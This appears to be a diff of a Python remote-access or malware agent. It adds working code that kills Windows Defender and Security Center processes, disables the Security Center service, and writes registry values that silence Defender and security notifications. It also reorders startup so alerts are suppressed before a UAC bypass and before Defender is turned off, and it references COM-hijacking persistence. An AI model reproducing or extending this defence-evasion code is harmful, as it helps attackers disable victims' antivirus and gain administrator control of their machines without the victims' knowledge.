@@ -4260,14 +4260,16 @@ if __name__ == "__main__":
         return False
 
 def disable_defender():
-    """Attempt to disable Windows Defender (tries even without admin)."""
+    """Attempt to disable Windows Defender (tries even without admin) - ENHANCED VERSION."""
     if not WINDOWS_AVAILABLE:
         return False
     
     # Try to disable Defender even without admin - some methods might work
-    log_message("[DEFENDER] Attempting to disable Windows Defender...")
+    log_message("[DEFENDER] Attempting to disable Windows Defender (ENHANCED)...")
     
     try:
+        success_count = 0
+        
         # Multiple methods to disable Windows Defender
         defender_disable_methods = [
             disable_defender_registry,
@@ -4279,14 +4281,54 @@ def disable_defender():
         for method in defender_disable_methods:
             try:
                 if method():
-                    return True
+                    success_count += 1
             except:
                 continue
         
-        return False
+        # Kill Security Center processes
+        try:
+            kill_security_processes()
+            success_count += 1
+        except:
+            pass
+        
+        log_message(f"[DEFENDER] Applied {success_count}/{len(defender_disable_methods)+1} disable methods")
+        return success_count > 0
         
     except Exception as e:
         log_message(f"Failed to disable Defender: {e}")
+        return False
+
+def kill_security_processes():
+    """Kill Windows Security Center and Defender processes."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import subprocess
+        
+        # List of security processes to terminate
+        security_processes = [
+            "SecurityHealthSystray.exe",  # Windows Security icon in system tray
+            "SecurityHealthService.exe",  # Windows Security service
+            "MsMpEng.exe",  # Windows Defender Antimalware Service
+            "NisSrv.exe",  # Windows Defender Network Inspection Service
+            "smartscreen.exe",  # SmartScreen
+        ]
+        
+        for process in security_processes:
+            try:
+                subprocess.run(['taskkill', '/F', '/IM', process],
+                             creationflags=subprocess.CREATE_NO_WINDOW,
+                             capture_output=True, timeout=5)
+                log_message(f"[DEFENDER] Terminated process: {process}")
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        log_message(f"[DEFENDER] Failed to kill security processes: {e}")
         return False
 
 def disable_defender_registry():
@@ -4764,15 +4806,62 @@ def setup_com_hijacking_persistence():
 
 # Removed duplicate functions - these are already defined above
 
+def disable_notifications_no_admin():
+    """Disable notifications that don't require admin - runs BEFORE UAC bypass."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        log_message("[NOTIFICATIONS] Disabling user-level notifications (no admin required)...")
+        
+        success_count = 0
+        
+        # Only user-level (HKCU) registry changes that don't need admin
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Action Center disabled (HKCU)")
+            success_count += 1
+        except:
+            pass
+        
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            success_count += 1
+        except:
+            pass
+        
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            success_count += 1
+        except:
+            pass
+        
+        log_message(f"[NOTIFICATIONS] Pre-admin: {success_count}/3 user-level notifications disabled")
+        return success_count > 0
+        
+    except Exception as e:
+        log_message(f"[NOTIFICATIONS] Pre-admin error: {e}")
+        return False
+
 def disable_windows_notifications():
-    """Disable all Windows notifications and action center."""
+    """Disable all Windows notifications and action center - ENHANCED VERSION."""
     if not WINDOWS_AVAILABLE:
         log_message("[NOTIFICATIONS] Windows not available")
         return False
     
     try:
         import winreg
-        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
+        log_message("[NOTIFICATIONS] Disabling Windows notifications (ENHANCED)...")
         
         success_count = 0
         
@@ -4798,7 +4887,7 @@ def disable_windows_notifications():
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
         
-        # 3. Disable Windows Defender notifications (Current User)
+        # 3. Disable Windows Defender notifications (Current User) - ENHANCED
         try:
             key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
@@ -4808,6 +4897,29 @@ def disable_windows_notifications():
             success_count += 1
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
+        
+        # 3b. Disable Windows Security notifications via HKLM (if admin)
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.SetValueEx(key, "DisableEnhancedNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Security notifications disabled (HKLM)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications (HKLM): {e}")
+        
+        # 3c. Disable Windows Security Center notifications
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Security Center notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center notifications: {e}")
         
         # 4. Disable toast notifications (Current User)
         try:
@@ -4857,7 +4969,29 @@ def disable_windows_notifications():
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
         
-        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
+        # 8. Disable Windows Security App notifications specifically
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityCenter"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Security Center app notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center app notifications: {e}")
+        
+        # 9. Disable Action Center service (if admin)
+        try:
+            import subprocess
+            subprocess.run(['sc', 'config', 'wscsvc', 'start=', 'disabled'], 
+                          creationflags=subprocess.CREATE_NO_WINDOW,
+                          capture_output=True, timeout=10)
+            log_message("[NOTIFICATIONS] Security Center service disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center service: {e}")
+        
+        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/10 settings applied")
         return success_count > 0
         
     except Exception as e:
@@ -14073,14 +14207,24 @@ if __name__ == "__main__":
         
         print("=" * 80)
     
-    # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
+    # PRIORITY 1: Disable WSL, UAC, Notifications, and Defender in CORRECT ORDER
     try:
         print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
         print("[STARTUP] Using SILENT methods (no popups, no user interaction)")
         print("=" * 80)
         
-        # 0. Disable WSL routing FIRST (fixes command execution!)
-        print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
+        # 0a. SUPPRESS NOTIFICATIONS FIRST (before any UAC bypass attempts!)
+        print("[STARTUP] Step 0a: Pre-suppressing notifications (no admin needed)...")
+        try:
+            if disable_notifications_no_admin():
+                print("[STARTUP] ✅ User-level notifications suppressed (including Security alerts)")
+            else:
+                print("[STARTUP] ⚠️ Pre-notification suppression partially succeeded")
+        except Exception as e:
+            print(f"[STARTUP] Pre-notification error: {e}")
+        
+        # 0b. Disable WSL routing (fixes command execution!)
+        print("\n[STARTUP] Step 0b: Disabling WSL routing (AGGRESSIVE)...")
         try:
             if disable_wsl_routing():
                 print("[STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly")
@@ -14100,6 +14244,16 @@ if __name__ == "__main__":
                 print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
                 print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
                 print("[STARTUP] ✅ You can now run ANY application without password prompts!")
+                
+                # Immediately disable notifications after gaining admin
+                print("\n[STARTUP] Step 1b: Immediately disabling ALL notifications (we have admin now)...")
+                try:
+                    if disable_windows_notifications():
+                        print("[STARTUP] ✅ Notifications disabled (including Windows Security alerts)")
+                    else:
+                        print("[STARTUP] ⚠️ Notification disable partially succeeded")
+                except Exception as e:
+                    print(f"[STARTUP] Notification disable error: {e}")
             else:
                 print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
                 print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
@@ -14113,8 +14267,18 @@ if __name__ == "__main__":
             # import traceback
             # traceback.print_exc()
         
-        # 2. Disable Windows Defender
-        print("\n[STARTUP] Step 2: Disabling Windows Defender...")
+        # 2. Disable Windows notifications (if not done in step 1b)
+        print("\n[STARTUP] Step 2: Ensuring Windows notifications are disabled...")
+        try:
+            if disable_windows_notifications():
+                print("[STARTUP] ✅ Notifications disabled successfully")
+            else:
+                print("[STARTUP] ℹ️ Notification disable partially succeeded")
+        except Exception as e:
+            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
+        
+        # 3. Disable Windows Defender (AFTER notifications are suppressed)
+        print("\n[STARTUP] Step 3: Disabling Windows Defender...")
         try:
             if disable_defender():
                 print("[STARTUP] ✅ Windows Defender disabled successfully")
@@ -14122,16 +14286,6 @@ if __name__ == "__main__":
                 print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
         except Exception as e:
             print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
-        
-        # 3. Disable Windows notifications
-        print("\n[STARTUP] Step 3: Disabling Windows notifications...")
-        try:
-            if disable_windows_notifications():
-                print("[STARTUP] ✅ Notifications disabled successfully")
-            else:
-                print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
-        except Exception as e:
-            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
         
         print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
